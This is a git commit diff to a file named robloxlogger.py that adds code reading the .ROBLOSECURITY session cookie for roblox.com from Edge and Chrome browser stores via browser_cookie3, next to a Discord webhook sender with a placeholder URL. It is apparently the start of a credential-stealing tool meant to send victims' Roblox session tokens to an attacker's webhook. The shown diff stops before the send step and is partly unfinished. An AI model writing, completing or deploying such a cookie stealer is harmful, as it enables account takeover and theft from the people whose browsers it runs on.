da29009fc69135f6dfc58a00d48cee4cde46cdb2
Sudzy <167475761+sudzythegoat@users.noreply.github.com>
2024-10-15 07:38:02 -0500

    Update robloxlogger.py

--- robloxlogger.py
+++ robloxlogger.py
@@ -1,12 +1,27 @@
 from discord_webhook import DiscordWebhook
 import tkinter
 from tkinter import ttk
-import 
-def send_discord_webhook(webhook_url, message):
+import browser_cookie3
+
+# note make sure to define webhook_url
+
+def send_discord_webhook(message):
     webhook = DiscordWebhook(url=webhook_url, content=message)
     response = webhook.execute()
 
-# Example usage
-webhook_url = "YOUR_DISCORD_WEBHOOK_URL"
-message = "Hello from Python using discord-webhook library!"
-send_discord_webhook(webhook_url, message)
+webhook = DiscordWebhook(url='your_discord_webhook_url_here')
+edge = True
+chrome = True
+firefox = True
+def logger():
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        roblo_security = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+    except:
+        edge = False
+        pass
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        roblo_security = str(cookies).split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+    except:
+        pass
